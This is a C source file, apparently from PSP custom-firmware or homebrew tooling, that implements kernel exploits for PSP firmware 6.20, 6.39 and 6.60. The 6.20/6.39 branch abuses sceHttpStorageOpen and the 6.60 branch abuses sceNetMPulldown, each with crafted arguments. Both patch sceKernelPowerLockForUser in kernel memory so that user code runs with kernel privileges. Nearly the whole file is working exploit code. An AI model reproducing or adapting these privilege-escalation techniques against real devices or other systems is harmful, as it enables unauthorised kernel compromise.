#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "main.h"
#include "kxploit_offs.h"

void recovery_sysmem(void)
{
	_sw(0x3C058801, sceKernelPowerLockForUser_Offs); // lui $a1, 0x8801
}

#if _PSP_FW_VERSION == 620 || _PSP_FW_VERSION == 639
void doKernelExploit(const char* msg)
{
	u32 kernel_entry, entry_addr;
	u32 interrupts;
	u32 i;
	int ret;

	for(i=1; i<=6; ++i) {
		ret = sceUtilityLoadModule(i + 0xFF);
	}

	ret = sceHttpStorageOpen(-612, 0, 0);

	sync_cache();

	ret = sceHttpStorageOpen((sceKernelPowerLockForUser_Offs >> 2), 0, 0); // scePowerLock override

	sync_cache();

	if (msg != NULL) printk(msg);
	sceDisplaySetHoldMode(1);

	// Call kernel_permission_call by hacked sceKernelPowerLock
	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - sceKernelPowerLockForUser_data_offset);
	pspSdkEnableInterrupts(interrupts);

	// Unload network libraries
	for(i=6; i>=1; --i) {
		ret = sceUtilityUnloadModule(i + 0xFF);
	}
}

#elif _PSP_FW_VERSION == 660

void doKernelExploit(const char* msg)
{
	typedef struct sceKernelIfHandleParam
	{
		struct sceKernelIfHandleParam *unk_0;
		u32 unk_4;
		u32 unk_8;
		u32 unk_12;
		u16 unk_16;
		u16 unk_18;
		u32 unk_20;
		u32 unk_24;
		u32 unk_28;
		u32 unk_32;
		u32 unk_36;
		u32 unk_40;
		u32 unk_44;
		u32 unk_48;
		u32 unk_52;
		u32 unk_56;
		u32 unk_60;
		u32 unk_64;
		u32 unk_68;
		u32 unk_72;
	} sceKernelIfHandleParam;

	u32 val;
	sceKernelIfHandleParam param_top;
	sceKernelIfHandleParam param_sub;
	
	sceUtilityLoadNetModule(1);
	
	memset(&param_top, 0, sizeof(sceKernelIfHandleParam));
	memset(&param_sub, 0, sizeof(sceKernelIfHandleParam));
	
	val = 0;
	
	// Fill sub structure
	param_sub.unk_8 = (u32)&val;
	param_sub.unk_12 = sizeof(u32);
	
	// Fill top structure
	param_top.unk_0 = &param_sub;
	param_top.unk_12 = 1;
	param_top.unk_18 = 1;
	param_top.unk_68 = (u32)&param_top;
	param_top.unk_8 = sceKernelPowerLockForUser_Offs - param_top.unk_12;
	param_top.unk_48 = sceKernelPowerLockForUser_Offs;
	param_top.unk_60 = sizeof(u32);
	
	sceNetMPulldown(&param_top, 0, param_top.unk_12 + sizeof(u32), NULL);
	sync_cache();

	if (msg != NULL) printk(msg);
	sceDisplaySetHoldMode(1);

	u32 kernel_entry, entry_addr;
	u32 interrupts;
	interrupts = pspSdkDisableInterrupts();
	kernel_entry = (u32) &kernel_permission_call;
	entry_addr = ((u32) &kernel_entry) - 16;
	sceKernelPowerLock(0, ((u32) &entry_addr) - sceKernelPowerLockForUser_data_offset);
	pspSdkEnableInterrupts(interrupts);

	sceUtilityUnloadModule(1);
}

#else
#error in kxploit.c
#endif
